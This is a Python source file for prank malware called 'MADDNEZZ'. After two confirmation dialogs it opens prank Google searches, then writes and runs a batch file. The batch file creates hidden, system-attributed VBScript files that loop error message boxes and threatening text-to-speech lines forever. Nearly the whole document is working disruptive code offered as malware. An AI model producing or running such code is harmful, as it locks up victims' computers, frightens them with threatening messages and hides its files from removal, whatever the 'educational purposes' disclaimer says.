"""
MADDNEZZ SOURCE CODE
This was made for educational purposes only.
Copying this anywhere online is illegal.
DO NOT PUT THIS ANYWHERE ONLINE!!!

"""
from tkinter import messagebox

if messagebox.askyesno("WARNING", "The Software you executed is considered malware. This could semi-harm your computer. Do you want to run it (it has weird payloads)?") == True:
    if messagebox.askyesno("LAST WARNING", "Do you still want to run it???????") == True:
        import webbrowser
        from random import choice, randint
        from time import sleep
        from os.path import isfile
        from os import remove
        from subprocess import run

        if isfile("maddnezz.bat"):
            remove("maddnezz.bat")

        f=open("maddnezz.bat", "x")
        f=open("maddnezz.bat", "w")

        full_payloads="""


        @echo off
        set /a filecount=1
        set /a loopcount=1
        set /a loopend=51
        title Huhhhhhhh???
        cls
        echo MsgBox "You're dead!!!", 16, "OOh God..." > "error.vbs"
        attrib +h +s +r error.vbs
        echo MsgBox "Ur Next!!!", 48, "Huh..." > "error2.vbs"
        attrib +h +s +r error2.vbs

        :loop
        echo Do While True: > "UR_NEXT (%filecount%).vbs"
        echo CreateObject("SAPI.SPVOICE").speak("U ARE THE NEXT, I CAN SEE YOU. DON'T EVER LOOK BEHIND YOU") >> "UR_NEXT (%filecount%).vbs" 
        echo loop >> "UR_NEXT (%filecount%).vbs"
        set /a loopcount=loopcount+1
        set /a filecount=filecount+1

        if %loopcount%==%loopend% goto p
        goto loop
        :p
        echo Do While True: > "payload.vbs"
        echo set wshell=CreateObject("Wscript.Shell") >> "payload.vbs"
        echo wshell.Run("wscript error.vbs") >> "payload.vbs"
        echo wshell.Run("wscript error2.vbs") >> "payload.vbs"
        echo loop >> "payload.vbs"
        attrib +h +s +r payload.vbs
        wscript payload.vbs
        exit

        """

        f.write(full_payloads)
        f.close()



        links=("how+2+buy+weed", "virus+download+with+bonzi+buddy", "how+to+break+your+computer", "funny+pigs", "3d+twerking+game", "skibidi+toilet+meme+collection", "freddy+fazbear+meMe", "youareanidiot+virus+link")


        #First payload
        i=0
        for i in range(0, 7):
            sleep(randint(5, 10))
            webbrowser.open(url="https://google.com/search?q="+choice(links))
            
            i+=1


        #Final Payloads

        run("maddnezz.bat") #Runs the batch element
        remove("maddnezz.bat") #Deletes the payload since once this has done, the other payloads are still running from the files it created.

